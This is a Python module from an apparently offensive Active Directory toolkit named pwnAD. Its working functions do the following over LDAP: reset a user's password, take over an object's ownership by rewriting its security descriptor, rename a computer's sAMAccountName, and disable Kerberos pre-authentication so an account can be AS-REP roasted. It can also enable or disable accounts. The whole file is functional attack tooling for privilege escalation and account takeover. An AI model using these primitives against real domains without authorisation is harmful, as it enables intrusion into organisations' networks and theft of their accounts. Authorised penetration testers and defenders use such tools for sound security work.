import copy
import ldap3
import random
import string
import logging
from impacket.ldap import ldaptypes
from ldap3 import MODIFY_REPLACE
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.protocol.formatters.formatters import format_sid

from pwnAD.lib.utils import check_error


def password(conn, account, new_password):
    if new_password is False:
        new_password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

    targetDN, _ = conn.ldap_get_user(account)

    try:
        conn.modify(targetDN, {'unicodePwd': [(ldap3.MODIFY_REPLACE, ['"{}"'.format(new_password).encode('utf-16-le')])]})
        logging.info("Successfully changed %s password to: %s" % (account, new_password))
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def owner(conn, target: str, new_owner: str):
    target_dn, _ = conn.ldap_get_user(target)
    controls = security_descriptor_control(sdflags=0x01)
    conn.search(search_base=conn._baseDN, search_filter=f'(distinguishedName={target_dn})', attributes=['nTSecurityDescriptor'], controls=controls)
    try:
        target_principal = conn._ldap_connection.entries[0]
        logging.debug(f'Target principal found in LDAP : {target}')
    except IndexError:
        logging.error(f'Target principal not found in LDAP : {target}')
        return
    
    target_principal_raw_security_descriptor = target_principal['nTSecurityDescriptor'].raw_values[0]
    target_principal_security_descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target_principal_raw_security_descriptor)

    conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(new_owner), attributes=['objectSid'])
    try:
        new_owner_SID = format_sid(conn._ldap_connection.entries[0]['objectSid'].raw_values[0])
        logging.debug("Found new owner SID: %s" % new_owner_SID)
    except IndexError:
        logging.error('New owner SID not found in LDAP (%s)' % target)
        return

    current_owner_SID = format_sid(target_principal_security_descriptor['OwnerSid']).formatCanonical()
    logging.info("Current owner information below")
    logging.info("- SID: %s" % current_owner_SID)
    logging.info("- sAMAccountName: %s" % conn.get_samaccountname_from_sid(current_owner_SID))
    conn._ldap_connection.search(conn._baseDN, '(objectSid=%s)' % current_owner_SID, attributes=['distinguishedName'])
    current_owner_distinguished_name = conn._ldap_connection.entries[0]
    logging.info("- distinguishedName: %s" % current_owner_distinguished_name['distinguishedName'])

    logging.debug('Attempt to modify the OwnerSid')
    _new_owner_SID = ldaptypes.LDAP_SID()
    _new_owner_SID.fromCanonical(new_owner_SID)
    target_principal_security_descriptor['OwnerSid'] = _new_owner_SID

    try:
        conn.modify(
            target_principal.entry_dn,
            {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [
                target_principal_security_descriptor.getData()
            ])},
            controls=security_descriptor_control(sdflags=0x01))
        logging.info('OwnerSid modified successfully!')
    except Exception as e:
            error_code = conn._ldap_connection.result['result']
            check_error(conn, error_code, e)


def computer_name(conn, current_name, new_name):
   
    conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(current_name), attributes=['objectSid', 'sAMAccountName'])
    computer_dn = conn._ldap_connection.entries[0].entry_dn
    if not computer_dn:
        return "Computer not found in LDAP: %s" % current_name

    entry = conn._ldap_connection.entries[0]
    samAccountName = entry["samAccountName"].value
    logging.info("Original sAMAccountName: %s" % samAccountName)

    logging.info("New sAMAccountName: %s" % new_name)

    try:
        conn.modify(computer_dn, {'sAMAccountName':(ldap3.MODIFY_REPLACE, [new_name])})
        logging.info("Updated sAMAccountName successfully")
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def dontreqpreauth(conn, account, flag):
    UF_DONT_REQUIRE_PREAUTH = 4194304

    conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(account), attributes=['objectSid', 'userAccountControl'])
    user_dn = conn._ldap_connection.entries[0].entry_dn
    if not user_dn:
        return "User not found in LDAP: %s" % account

    entry = conn._ldap_connection.entries[0]
    userAccountControl = entry["userAccountControl"].value
    logging.info("Original userAccountControl: %d" % userAccountControl) 

    set_flag = True if flag == "True" else False

    if set_flag:
        userAccountControl = userAccountControl | UF_DONT_REQUIRE_PREAUTH
    else:
        userAccountControl = userAccountControl & ~UF_DONT_REQUIRE_PREAUTH

    logging.info("Updated userAccountControl: %d" % userAccountControl) 

    try:
        conn.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
        logging.info("Updated userAccountControl attribute successfully")
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)


def disable_account(conn, username):
    _toggle_account_enable_disable(conn, username, False)

def enable_account(conn, username):
    _toggle_account_enable_disable(conn, username, True)

def _toggle_account_enable_disable(conn, user_name, enable):
    UF_ACCOUNT_DISABLE = 2
    conn.search(conn._baseDN, '(sAMAccountName=%s)' % escape_filter_chars(user_name), attributes=['objectSid', 'userAccountControl'])

    if len(conn._ldap_connection.entries) != 1:
        logging.error("Error expected only one search result got %d results", len(conn._ldap_connection.entries))
        return

    user_dn = conn._ldap_connection.entries[0].entry_dn
    if not user_dn:
        logging.error("User not found in LDAP: %s" % user_name)
        return

    entry = conn._ldap_connection.entries[0]
    userAccountControl = int(entry["userAccountControl"].value)

    logging.info("Original userAccountControl: %d" % userAccountControl) 

    if enable:
        userAccountControl = userAccountControl & ~UF_ACCOUNT_DISABLE
    else:
        userAccountControl = userAccountControl | UF_ACCOUNT_DISABLE

    try:
        conn.modify(user_dn, {'userAccountControl':(ldap3.MODIFY_REPLACE, [userAccountControl])})
        logging.info("Updated userAccountControl attribute successfully")
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)
